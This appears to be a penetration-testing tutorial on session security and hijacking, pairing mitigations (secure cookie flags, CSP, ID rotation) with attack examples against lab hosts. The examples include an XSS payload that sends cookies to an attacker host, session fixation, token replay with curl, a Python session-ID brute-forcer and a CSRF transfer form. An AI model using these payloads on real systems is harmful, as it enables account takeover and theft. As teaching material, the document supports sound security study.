# Session Security

#### Session Security and Advanced Session Hijacking Exploits

A user session bridges multiple interactions between a client and server using a unique session identifier (session ID). Securing sessions is paramount, as compromised sessions can lead to complete account takeovers or even further lateral movement within a target system. Let’s dive into deeper insights, examples, and some advanced tricks.

***

#### **Session ID Weaknesses**

1. **Predictable Session IDs**\
   Some poorly designed applications generate session IDs with predictable patterns, such as sequential numbering, timestamps, or weak cryptographic randomization.
   *   Example of predictable generation:

       ```plaintext
       Session ID: user001, user002, user003
       Session ID: 202311181230
       ```
   *   Exploit: An attacker might brute-force predictable IDs using tools like **Burp Suite Intruder**:

       ```plaintext
       Intruder Payload: Session IDs 202311181230 to 202311181259
       ```
2. **Session IDs Exposed in URLs**\
   When session IDs are passed in the URL as query parameters (`example.com/dashboard?session_id=abc123`), they may get logged in server logs, shared in referrer headers, or stored in browser history.
   *   Exploit Trick: Craft a phishing email embedding a malicious link:

       ```plaintext
       https://vulnerable-site.babelpentest.net/dashboard?session_id=<victim_id>
       ```
3. **Reuse of Session Tokens After Logout**\
   If an application doesn’t properly invalidate a session on logout, attackers can reuse the token even after a legitimate user logs out.
   * Example:
     * Legitimate user logs out.
     *   Attacker reuses the same session token (`auth-token=abc123`) via `curl`:

         ```bash
         curl -H "Cookie: auth-token=abc123" https://secure.babelpentestlab.net/user-panel
         ```

***

#### **Advanced Session Hijacking Techniques**

**1. Session Fixation**

Attackers set the victim's session ID to a known value before the victim logs in, allowing attackers to impersonate them after authentication.

* **Steps**:
  1.  Attacker forces a victim to use a predetermined session ID via phishing or XSS:

      ```javascript
      document.cookie = "PHPSESSID=attackerknownid; path=/;";
      ```
  2. Victim logs into the site, unaware that the attacker is already authenticated with the same session ID.
  3.  Attacker accesses the victim's session:

      ```bash
      curl -H "Cookie: PHPSESSID=attackerknownid" https://vulnerable-site.babelpentestlab.net/user-dashboard
      ```

**2. Cookie Sniffing via Man-in-the-Middle (MITM)**

If cookies are not transmitted over HTTPS, they are vulnerable to interception:

* **Tooling Example**:
  * Use `Wireshark` to capture unencrypted traffic.
  * Filter HTTP requests for `Set-Cookie` headers.
* **Mitigation**: Ensure cookies are marked `Secure` and enforce HTTPS.

**3. Exploiting XSS for Session Theft**

When combined with XSS vulnerabilities, session hijacking becomes even more devastating.

*   Example Payload:

    ```javascript
    <script>
    fetch('http://attacker.babelpentestlab.net/steal?c=' + document.cookie);
    </script>
    ```
* Mitigation:
  *   Use `Content Security Policy (CSP)` headers to limit scripts:

      ```plaintext
      Content-Security-Policy: script-src 'self';
      ```

**4. Session Side-Jacking with Tools**

If no additional protections like HSTS (HTTP Strict Transport Security) are in place, attackers can exploit cookies via popular tools:

* **Tools**:
  * **Firesheep**: Captures cookies over unsecured Wi-Fi networks.
  * **Bettercap**: For advanced MITM attacks on HTTPS traffic.

***

#### **Browser Storage and Session Exposure**

**localStorage vs sessionStorage vs Cookies**

1. **Cookies**:
   * Pros: Sent with every HTTP request (easy for server-side validation).
   * Cons: Vulnerable to XSS and requires secure flags.
2. **localStorage**:
   * Persistent across sessions.
   * Should **never** be used to store sensitive data like session tokens.
   *   Example Risk:

       ```javascript
       localStorage.setItem('auth-token', 'abc123');
       ```
3. **sessionStorage**:
   * Resets on browser close but still exposed to XSS attacks.

**Tips for Developers:**

*   Use `HttpOnly`, `Secure`, and `SameSite` cookie attributes:

    ```plaintext
    Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict;
    ```

***

#### **Session Expiry and Refresh**

1. **Short Expiry Times**: Expiring sessions after a short time of inactivity limits the attack window.\
   Example Configuration:
   *   Set session timeout to 15 minutes:

       ```php
       ini_set('session.gc_maxlifetime', 900);
       ```
2.  **Session Re-Randomization**: Rotate session IDs after login or privilege escalation:

    ```php
    session_regenerate_id(true);
    ```

***

#### **Testing Tools for Session Security**

1. **Burp Suite**:
   * Use the **Session Token Analysis** tool to test randomness and length.
   * Capture and manipulate cookies via the **Proxy** tab.
2. **OWASP ZAP**:
   * Active scan to identify unprotected cookies or insecure storage.
3.  **Custom Python Script for Brute-Forcing Session Tokens**:

    ```python
    import requests

    base_url = "https://vulnerable-site.babelpentestlab.net"
    for i in range(1000, 1100):
        cookies = {"session_id": str(i)}
        response = requests.get(base_url, cookies=cookies)
        if "Welcome Back" in response.text:
            print(f"Valid Session ID Found: {i}")
            break
    ```

***

#### **Advanced Tricks**

1. **CSRF + Session Hijacking**: Combine CSRF (Cross-Site Request Forgery) with weak session handling:
   *   Force victim to perform actions while using a hijacked session:

       ```html
       <form action="https://secure.babelpentestlab.net/transfer" method="POST">
           <input type="hidden" name="amount" value="1000">
           <input type="hidden" name="recipient" value="attacker">
           <input type="submit">
       </form>
       ```
2. **Privilege Escalation via Session Tokens**:
   *   Some applications encode roles in tokens:

       ```plaintext
       session_token=eyJ1c2VyIjoiYWRtaW4ifQ==
       ```
   *   Decode and modify the token (`admin` → `superuser`):

       ```bash
       echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
       ```
3. **Subdomain Enumeration for Session Sharing**:
   *   Test subdomains for cookie sharing:

       ```bash
       subfinder -d babelpentestlab.net | httpx --status-code
       ```
4.  **Cookie Path Exploitation**: Misconfigured `Path` attributes allow token reuse on unintended endpoints:

    ```plaintext
    Set-Cookie: auth=abc123; Path=/api/v1/
    ```

    *   Access admin functions directly:

        ```bash
        curl -H "Cookie: auth=abc123" https://babelpentestlab.net/api/v1/admin
        ```
